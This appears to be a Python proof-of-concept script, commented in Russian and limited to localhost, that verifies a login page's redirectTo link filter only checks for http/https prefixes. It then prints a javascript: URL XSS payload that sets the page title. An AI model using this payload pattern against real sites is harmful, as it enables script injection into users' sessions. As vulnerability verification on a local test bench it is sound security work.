# -*- coding: utf-8 -*-
"""Ссылка «Continue» на /login принимает javascript: и protocol-relative URL.
Фильтр отсекает только строки, которые начинаются с http:// или https://.

    python 23_login_redirect.py
"""
import re
import urllib.error
import urllib.parse
import urllib.request

urllib.request.install_opener(
    urllib.request.build_opener(urllib.request.ProxyHandler({}))
)

POC = "/login?redirectTo=javascript:document.title='XSS-OK'"


def check_local(base: str) -> str:
    host = urllib.parse.urlparse(base).hostname
    if host not in {"127.0.0.1", "localhost", "::1"}:
        raise SystemExit(f"только локальный стенд, получен {host}")
    return base.rstrip("/")


def get(url: str) -> str:
    try:
        with urllib.request.urlopen(url, timeout=20) as resp:
            return resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        raise SystemExit(f"{url} -> {e.code}") from e


def main():
    import argparse

    p = argparse.ArgumentParser(description="Слабый redirectTo на странице входа")
    p.add_argument("--base", default="http://127.0.0.1:8080")
    args = p.parse_args()
    base = check_local(args.base)

    html = get(base + "/login")
    runtime_src = re.search(r'src="(/runtime[^"]+\.js)"', html)
    main_src = re.search(r'src="(/main[^"]+\.js)"', html)
    if not runtime_src or not main_src:
        raise SystemExit("на /login нет runtime/main скриптов")

    runtime = get(base + runtime_src.group(1))
    main_js = get(base + main_src.group(1))
    login = re.search(r'path:"/login".{0,500}?t\.e\((\d+)\)', main_js)
    if not login:
        raise SystemExit("в main.js не найден чанк страницы /login")
    chunk_id = login.group(1)
    hashes = dict(re.findall(r"(\d+):\"([0-9a-f]{16,})\"", runtime))
    if chunk_id not in hashes:
        raise SystemExit(f"нет хеша чанка {chunk_id}")
    filename = f"/{chunk_id}.{hashes[chunk_id]}.js"
    body = get(base + filename)
    weak = 'startsWith("http://")' in body and 'startsWith("https://")' in body
    sets_href = 'setAttribute("href"' in body or "setAttribute(\"href\"" in body
    if not weak or not sets_href:
        raise SystemExit(f"слабая проверка не найдена в {filename}")

    print(f"OK слабый фильтр в {filename}")
    print(base + POC)


if __name__ == "__main__":
    main()
